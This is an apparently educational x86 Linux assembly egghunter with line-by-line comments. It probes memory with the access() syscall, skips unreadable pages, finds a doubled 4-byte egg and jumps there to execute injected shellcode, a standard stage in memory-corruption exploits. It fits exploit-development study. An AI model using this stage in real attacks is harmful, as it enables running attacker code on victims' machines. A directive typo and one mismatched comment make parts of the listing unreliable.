global_start

section .text
_start:
  
mov ebx, 0x50905090	; here, we're just going to store a 4 byte value in $ebx as our egg
xor ecx, ecx		
mul ecx

page_forward:		; here, we're going to design a function of what to do if we get an EFAULT error
or dx, 0xfff		; doing a bitwise logical OR against the $dx value

address_check:		; here we're going to design a function to check the next 8 bytes of mem
inc edx			; gets $edx to a nice multiple of 4096
pushad			; this will preserve our register values by pushing them onto a stack while we syscall
lea ebx, [edx+4]	; putting edx plus 8 to check if this fresh page is readable by us
mov al, 0x21		; syscall for access(), we know this by now :)
int 0x80

cmp al, 0xf2		; does the low-end of $eax equal 0xf2? In other words, did we get an EFAULT? 
popad			; restore our register values we preserved
jz page_forward		; if we got an EFAULT, this page is unreadable, time to go to the next page!

cmp [edx], ebx		; is what is stored at the address of $edx our egg (0x50905090) ?
jnz address_check	; if it's not, let's advance into the page and see if we can't find that pesky egg

cmp [edx+4], ebx	; we found our egg once, let's see if it's also in $edx + 4
jnz address_check	; we found it once but not twice, have to keep looking

jmp edx			; we found it twice! go to edx (where our egg is) and execute the code there! 
